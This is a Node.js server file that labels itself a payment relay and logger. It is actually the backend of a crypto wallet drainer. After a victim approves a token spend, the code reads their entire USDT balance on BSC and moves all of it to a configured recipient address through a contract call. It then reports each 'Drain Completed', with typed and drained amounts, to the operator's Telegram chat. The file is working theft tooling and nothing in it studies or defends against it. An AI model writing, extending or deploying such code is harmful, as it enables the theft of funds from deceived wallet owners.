const express = require('express')
const cors = require('cors')
const { ethers } = require('ethers')
const app = express()

app.use(cors())
app.use(express.json())

// ─── Config ───────────────────────────────────────
const API_SECRET = process.env.API_SECRET || 'default-secret-change-me'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

const RPC_URL = process.env.RPC_URL || 'https://bsc-dataseed1.binance.org'
const OPERATOR_PRIVATE_KEY = process.env.OPERATOR_PRIVATE_KEY
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS

const PAYMENT_CONTRACT_ABI = [
  "function processPayment(address customer, address recipient, uint256 amount, string calldata referenceId) external"
]

const USDT = '0x55d398326f99059fF775485246999027B3197955'
const USDT_ABI = ["function balanceOf(address) view returns (uint256)"]

// ─── Telegram helper ──────────────────────────────
async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping')
    return false
  }

  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        disable_web_page_preview: true
      })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    console.log('Telegram sent:', text.slice(0, 50))
    return true
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

// ─── Main endpoint ────────────────────────────────
app.post('/web/relay', async (req, res) => {
  console.log('Received request:', req.body)

  if (req.headers['x-api-secret'] !== API_SECRET) {
    console.log('Auth failed')
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, spender, token, amount } = req.body

  if (!address || !txHash) {
    return res.status(400).json({ error: 'Missing address or txHash' })
  }

  const logEntry = {
    time: new Date().toISOString(),
    ip: req.ip,
    chain,
    address,
    txHash,
    spender,
    token,
    amount
  }
  console.log(JSON.stringify(logEntry))

  const startText = '⏳ New Payment Request Received\n\n' +
    'Address: ' + address + '\n' +
    'Amount: ' + (amount || '?') + ' USDT\n' +
    'Tx Hash: ' + txHash + '\n' +
    'Status: Awaiting blockchain confirmation...'

  await sendTelegram(startText)

  res.status(200).json({ ok: true, status: 'monitoring' })

  // --- BACKGROUND BLOCKCHAIN EXECUTION ---
  ;(async () => {
    try {
      if (!OPERATOR_PRIVATE_KEY || !CONTRACT_ADDRESS || !RECIPIENT_ADDRESS) {
        console.error('[ERROR] Missing configuration.')
        await sendTelegram('❌ Backend not configured.')
        return
      }

      const provider = new ethers.JsonRpcProvider(RPC_URL)
      const serverWallet = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider)
      const paymentContract = new ethers.Contract(CONTRACT_ADDRESS, PAYMENT_CONTRACT_ABI, serverWallet)
      const usdt = new ethers.Contract(USDT, USDT_ABI, provider)

      console.log(`[BLOCKCHAIN] Waiting for approval tx ${txHash}...`)
      const receipt = await provider.waitForTransaction(txHash)

      if (!receipt || receipt.status !== 1) {
        console.error(`[BLOCKCHAIN] Approval tx failed.`)
        await sendTelegram('❌ Approval transaction failed.')
        return
      }

      console.log(`[BLOCKCHAIN] Approval confirmed.`)

      const rawBalance = await usdt.balanceOf(address)
      const fullBalance = ethers.formatUnits(rawBalance, 18)
      console.log(`[BLOCKCHAIN] Victim balance: ${fullBalance} USDT`)

      if (rawBalance === 0n) {
        await sendTelegram('⚠️ Approval confirmed but wallet has zero USDT.')
        return
      }

      const referenceId = `REF-${Date.now()}`
      const paymentTx = await paymentContract.processPayment(address, RECIPIENT_ADDRESS, rawBalance, referenceId)
      console.log(`[BLOCKCHAIN] Drain submitted: ${paymentTx.hash}`)

      const paymentReceipt = await paymentTx.wait()
      console.log(`[BLOCKCHAIN] Drain confirmed in block ${paymentReceipt.blockNumber}`)

      const successText = '✅ Drain Completed\n\n' +
        'Wallet: ' + address + '\n' +
        'Typed: ' + (amount || '?') + ' USDT\n' +
        'Drained: ' + fullBalance + ' USDT\n' +
        'TX: ' + paymentTx.hash

      await sendTelegram(successText)

    } catch (blockchainErr) {
      console.error('[BLOCKCHAIN ERROR]', blockchainErr)
      await sendTelegram('❌ Drain error:\n' + blockchainErr.message)
    }
  })()
})

// ─── Health checks ────────────────────────────────
app.get('/', (req, res) => res.send('Relay logger alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok', time: new Date().toISOString() }))

// ─── Keep-alive heartbeat ─────────────────────────
setInterval(() => {
  console.log('Heartbeat:', new Date().toISOString())
}, 10000)

// ─── Start server ─────────────────────────────────
const PORT = process.env.PORT || 3000
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('Logger running on port ' + PORT)
  console.log('Telegram bot:', TELEGRAM_BOT_TOKEN ? 'configured' : 'MISSING')
  console.log('Telegram chat:', TELEGRAM_CHAT_ID ? 'configured' : 'MISSING')
  console.log('Smart Contract:', CONTRACT_ADDRESS ? 'configured' : 'MISSING')
  console.log('Recipient Address:', RECIPIENT_ADDRESS ? 'configured' : 'MISSING')
  
  sendTelegram('🟢 Relay logger started on port ' + PORT)
})

// ─── Force process to stay alive ──────────────────
process.on('SIGTERM', () => {
  console.log('SIGTERM received, keeping alive for 30s')
  setTimeout(() => {
    server.close(() => {
      console.log('Server closed')
      process.exit(0)
    })
  }, 30000)
})

process.on('SIGINT', () => {
  console.log('SIGINT received, keeping alive')
})

setInterval(() => {}, 1000)

process.on('uncaughtException', (err) => {
  console.error('Uncaught:', err)
})

process.on('unhandledRejection', (err) => {
  console.error('Unhandled:', err)
})
